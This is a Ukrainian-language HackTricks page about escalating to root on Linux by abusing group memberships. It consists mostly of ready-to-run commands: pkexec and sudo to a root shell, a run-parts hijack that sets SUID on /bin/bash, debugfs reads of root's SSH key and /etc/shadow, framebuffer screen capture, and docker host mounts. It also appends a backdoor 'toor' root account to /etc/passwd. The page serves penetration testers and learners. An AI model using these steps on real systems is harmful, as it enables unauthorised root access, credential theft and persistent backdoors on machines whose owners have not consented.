# Цікаві групи - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Групи Sudo/Admin

### **PE - Method 1**

**Іноді**, **за замовчуванням (або через потреби певного програмного забезпечення)** у файлі **/etc/sudoers** можна знайти такі рядки:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконати будь-яку команду через sudo**.

Якщо це так, щоб **стати root, достатньо виконати**:
```
sudo su
```
### PE - Метод 2

Знайдіть усі бінарні файли suid і перевірте, чи є серед них бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявили, що binary **pkexec є SUID binary**, а ви належите до групи **sudo** або **admin**, імовірно, ви зможете виконувати binaries від імені sudo за допомогою `pkexec`.\
Це тому, що зазвичай саме ці групи вказані в **polkit policy**. Ця policy фактично визначає, які групи можуть використовувати `pkexec`. Перевірте її за допомогою:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Там ви знайдете, яким групам дозволено виконувати **pkexec**, і **за замовчуванням** у деяких дистрибутивах Linux присутні групи **sudo** та **admin**.

Щоб **стати root, можна виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви спробуєте виконати **pkexec** і отримаєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не через відсутність дозволів, а через те, що ви не підключені без GUI**. Обхідне рішення для цієї проблеми наведено тут: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібні **2 різні ssh-сесії**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Група Wheel

**Іноді**, **за замовчуванням** у файлі **/etc/sudoers** можна знайти цей рядок:
```
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконувати будь-що через sudo**.

Якщо це так, щоб **стати root, достатньо виконати**:
```
sudo su
```
## Група Shadow

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **зламати деякі хеші**.

Важливий нюанс щодо стану блокування під час аналізу хешів:
- Записи з `!` або `*` зазвичай є неінтерактивними для входу за паролем.
- `!hash` зазвичай означає, що пароль було встановлено, а потім заблоковано.
- `*` зазвичай означає, що дійсний хеш пароля ніколи не встановлювався.

Це корисно для класифікації облікових записів, навіть якщо прямий вхід заблоковано.

## Група Staff

**staff**: Дозволяє користувачам додавати локальні зміни до системи (`/usr/local`) без привілеїв root (зверніть увагу, що виконувані файли в `/usr/local/bin` містяться у змінній PATH будь-якого користувача й можуть «перевизначати» виконувані файли в `/bin` і `/usr/bin` з такою самою назвою). Порівняйте з групою «adm», яка більше пов’язана з моніторингом і безпекою. [\[джерело\]](https://wiki.debian.org/SystemGroups)

У debian-дистрибутивах змінна `$PATH` показує, що `/usr/local/` матиме найвищий пріоритет незалежно від того, чи є користувач привілейованим.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Якщо ми можемо перехопити деякі програми в `/usr/local`, то легко отримаємо root.

Перехоплення програми `run-parts` — це простий спосіб отримати root, оскільки більшість програм запускатиме `run-parts` (наприклад, crontab або під час входу через ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
або під час входу до нової SSH-сесії.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Група дисків

Цей привілей майже **еквівалентний root access**, оскільки ви можете отримати доступ до всіх даних усередині машини.

Файли:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зверніть увагу, що за допомогою debugfs також можна **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, можна виконати:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо спробувати **записати файли, власником яких є root** (наприклад, `/etc/shadow` або `/etc/passwd`), ви отримаєте помилку "**Permission denied**".

## Група Video

За допомогою команди `w` можна визначити, **хто увійшов до системи**, і вона покаже результат на кшталт наведеного нижче:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi фізично увійшов** до термінала на машині.

Група **video** має доступ до перегляду виводу екрана. По суті, можна спостерігати за екранами. Для цього потрібно **отримати поточне зображення з екрана** у вигляді raw data та визначити роздільну здатність, яку використовує екран. Дані екрана можна зберегти у `/dev/fb0`, а роздільну здатність цього екрана можна знайти у `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Щоб **відкрити** **raw image**, можна використати **GIMP**, вибрати файл **`screen.raw`** і як тип файлу вибрати **Raw image data**:

![Група Disk - Група Video: Щоб відкрити raw image, можна використати GIMP, вибрати файл screen.raw і як тип файлу вибрати Raw image data](<../../../images/image (463).png>)

Потім змініть Width і Height на значення, які використовуються на екрані, і перевірте різні Image Types (та виберіть той, який найкраще відображає екран):

![Група Disk - Група Video: Потім змініть Width і Height на значення, які використовуються на екрані, і перевірте різні Image Types (та виберіть той, який найкраще відображає екран)](<../../../images/image (317).png>)

## Група root

Схоже, що за замовчуванням **члени групи root** можуть мати доступ до **модифікації** деяких конфігураційних файлів **service**, файлів **libraries** або **інших цікавих речей**, які можна використати для підвищення привілеїв...

**Перевірте, які файли можуть модифікувати члени root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Ви можете **підключити кореневу файлову систему хост-машини до тому instance**, щоб під час запуску instance він одразу завантажував `chroot` у цей том. Це фактично надає вам root-доступ до машини.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Нарешті, якщо вам не подобається жодна з наведених вище пропозицій або вони з якоїсь причини не працюють (docker api firewall?), ви завжди можете спробувати **запустити привілейований container і виконати escape з нього**, як описано тут:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Якщо у вас є дозволи на запис до docker socket, прочитайте [**цей пост про те, як підвищити привілеї, використовуючи docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

Зазвичай **members** групи **`adm`** мають дозволи на **читання log** файлів, розташованих у _/var/log/_.\
Тому, якщо ви скомпрометували користувача, який входить до цієї групи, вам однозначно слід **переглянути logs**.

## Backup / Operator / lp / Mail groups

Ці групи часто є векторами **credential-discovery**, а не безпосередніми векторами отримання root-доступу:
- **backup**: може розкривати архіви з конфігураціями, ключами, дампами DB або токенами.
- **operator**: специфічний для платформи операційний доступ, який може leak конфіденційні дані під час роботи системи.
- **lp**: черги/спули друку можуть містити вміст документів.
- **mail**: поштові спули можуть розкривати посилання для скидання, OTP і внутрішні облікові дані.

Розглядайте членство в цих групах як важливу знахідку, пов’язану з витоком даних, і виконуйте pivot через повторне використання паролів/токенів.

## Auth group

В OpenBSD **auth** group зазвичай може виконувати запис до папок _**/etc/skey**_ і _**/var/db/yubikey**_, якщо вони використовуються.\
Цими дозволами можна зловживати за допомогою наведеного нижче exploit, щоб **підвищити привілеї** до root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
